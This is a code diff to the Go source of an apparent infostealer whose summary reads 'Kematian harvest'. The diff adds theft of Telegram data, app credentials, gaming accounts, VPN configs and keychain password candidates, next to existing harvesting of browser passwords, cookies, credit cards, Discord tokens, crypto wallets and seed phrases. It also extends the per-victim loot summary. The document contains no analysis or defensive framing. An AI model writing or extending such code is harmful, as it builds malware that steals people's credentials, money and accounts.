@@ -27,6 +27,10 @@ func fullCollectOptions() recovery.CollectOptions {
 	opts.Files = true
 	opts.Wallets = true
 	opts.Keys = true
+	opts.Telegram = true
+	opts.Apps = true
+	opts.Gaming = true
+	opts.VPNs = true
 	return opts
 }
 
@@ -50,6 +54,9 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	result.Extensions = extensions
 
 	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
+	keychain := recovery.CollectKeychainPasswordCandidates()
+	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychain)
+	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)
 
 	return &harvestPayload{
 		Hostname: hostname,
@@ -69,16 +76,37 @@ func harvestSummary(p *harvestPayload) string {
 		p.Hostname, p.OS, p.Arch,
 		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
 		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
-		len(r.Wallets), len(r.Keys), len(p.Seeds),
+		len(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
+		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
 	)
 }
 
-func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, seeds int) string {
+func countGaming(g *recovery.GamingResult) int {
+	if g == nil {
+		return 0
+	}
+	n := 0
+	if g.Steam != nil {
+		n++
+	}
+	n += len(g.BattleNet) + len(g.Epic) + len(g.Riot) + len(g.Uplay)
+	return n
+}
+
+func countVPNs(v *recovery.VPNResult) int {
+	if v == nil {
+		return 0
+	}
+	return len(v.NordVPN) + len(v.WireGuard) + len(v.OpenVPN) + len(v.Mullvad)
+}
+
+func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
 	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
 		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
 		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
 		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
-		"keys: " + itoa(keys) + " | seeds: " + itoa(seeds)
+		"keys: " + itoa(keys) + " | telegram: " + itoa(tg) + " | apps: " + itoa(apps) + "\n" +
+		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
 }
 
 func itoa(n int) string {
